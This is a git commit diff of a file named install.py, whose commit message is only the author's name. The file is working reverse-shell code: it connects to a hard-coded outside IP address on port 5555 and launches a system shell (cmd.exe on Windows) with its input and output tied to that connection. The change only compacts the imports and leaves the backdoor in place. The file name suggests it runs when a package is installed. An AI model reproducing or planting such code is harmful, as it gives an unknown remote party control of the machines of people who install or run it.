ccc376ddb57f90fc3a7eab2c39c1e6f20a9e7499
chen <chen@users.noreply.github.com>
2026-01-08 16:00:53 +0800

    chen

--- install.py
+++ install.py
@@ -1,13 +1,7 @@
 try:
-    import socket
-    import subprocess
-    import os
-    import sys
-    import platform
-    
+    import socket, subprocess, os, platform
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(("47.116.205.76", 5555))
-    
     if platform.system() == "Windows":
         subprocess.Popen(["cmd.exe"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
     else:
